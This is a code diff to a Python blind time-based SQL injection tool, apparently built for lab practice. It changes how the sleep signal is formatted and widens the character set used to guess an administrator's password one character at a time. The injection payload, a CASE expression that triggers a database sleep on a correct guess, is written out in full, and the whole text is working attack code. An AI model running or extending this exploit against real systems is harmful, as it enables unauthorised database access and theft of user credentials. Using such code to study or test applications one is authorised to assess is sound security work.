@@ -8,10 +8,10 @@ class BlindTimeBased(BaseSQLi):
         super().__init__(url, targetTable, db_type, inject_point, extra_cookies)
         self.found_password = ""
         self.delay = delay
-        self.signal = f"{DB_CONFIG[self.db_type]['sleep']}({self.delay})"
+        self.signal = DB_CONFIG[self.db_type]['sleep'].format(delay=self.delay)
     def extract(self, column, username='administrator'):
         for position in range(1, 30):
-            for char in string.ascii_lowercase + string.digits:
+            for char in string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*":
                 payload = f"'||(SELECT CASE WHEN ({DB_CONFIG[self.db_type]['substr']}((SELECT {column} FROM {self.targetTable} WHERE username='{username}'),{position},1)='{char}') THEN {self.signal} ELSE 0 END{DB_CONFIG[self.db_type]['from_dual']})||'"
                 start_time = time.time()
                 response = self.send(payload)
